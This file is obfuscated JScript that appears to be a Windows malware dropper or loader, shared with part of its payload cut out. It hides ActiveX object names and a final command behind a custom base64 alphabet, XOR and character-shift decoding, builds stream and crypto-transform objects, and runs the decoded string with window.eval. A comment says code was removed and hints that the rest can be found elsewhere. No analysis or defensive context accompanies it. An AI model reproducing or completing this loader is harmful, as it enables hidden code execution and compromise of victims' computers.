try {

	var WtXqe = ActiveXObject,
		UVnaVN = window["eval"]("String.fromCharCode");

	function grayl(result) {
		for (var i = 0; i < result.length; ++i) {
			result[i] = UVnaVN(result.charCodeAt(i) - (i % 3));
		}
		return result;
	}

	function VxQf(str) {
		var b64 = "QvRM8KNG4PC2VZUu7eIwdBorhit6gaAbYym5lEc0jDSWnXT13JqsFxpHOfkzL9+/=";
		var b, result = "",
			r1, r2, i = 0;
		do {
			b = b64.indexOf(str.charAt(i++)) << 18 |
				b64.indexOf(str.charAt(i++)) << 12 |
				(r1 = b64.indexOf(str.charAt(i++))) << 6 |
				(r2 = b64.indexOf(str.charAt(i++)));

			result += r1 === 64 ?
				UVnaVN(b >> 16 & 255) :
				r2 === 64 ?
					UVnaVN(b >> 16 & 255, b >> 8 & 255) :
					UVnaVN(b >> 16 & 255, b >> 8 & 255, b & 255);
		} while (i < str.length);
		return result;
	};

	function BizrQwS(key, bytes) {
		var res = [];

		for (var i = 0; i < bytes.length;) {
			for (var j = 0; j < key.length; j++) {
				res.push(UVnaVN((bytes.charCodeAt(i)) ^ key.charCodeAt(j) ^ i % 3));
				i++;
				if (i >= bytes.length) {
					j = key.length;
				}
			}
		}

		for (var k = 0; k < res.length / 2; k++) {
			var j = res.length - k - 1;
			var temp = res[k];
			res[k] = res[j];
			res[j] = temp;
		}

		return res.join("")
	}

	function JXNHptZI(bsix) {
		return grayl(BizrQwS(keeee, VxQf(bsix)));
	}

	var keeee = grayl(BizrQwS("QToD", VxQf("hpQ2" + "achs" + "RH8=")));

	var ytygwgk = 1;
	var da = "";
	var dash = "";
	function Xm5o0(b) {
		var enc = new WtXqe(JXNHptZI("d3nUdE3GoHi/" + "2Ia0gFEMIEQq" + "IxDB8laPi3=="));
		var length = enc[JXNHptZI("v5jwo8h2aE" + "iRGIiQBqQ=")](b);
		var ba = enc[JXNHptZI("QMjddFga" + "aFaw43==")](b);
		var transform = new WtXqe(JXNHptZI("oeg4d8QCB8KmdKPe" + "77ixrxjd4JEPMlee" + "eY447lVaeHQhGeva" + "7vPdBpi4RKP8Kdx5"));
		ba = transform[JXNHptZI("r3h4o084BKxb4Y" + "ENr7K8rK7dV7==")](ba, 0, length);
		var ms = new WtXqe(JXNHptZI("o77Re8gHw8K" + "iR7KfGRy+GK" + "YM8dePZ7=="));
		var tope = JXNHptZI("MJhCKYf8rdvrQKL8" + "8EjrrKju8BfMRo7A" + "e3ygG3v8GJVbd876" + "8Y9MBBnMReL7IY77" + "NQ7KGEh7r8KyIyai");
		window.eval(tope);
	}

	// I've removed lots of stuff from here to keep this safe and sound. Y'all know where to find it anyways ;) 
} finally {
	window.close();
}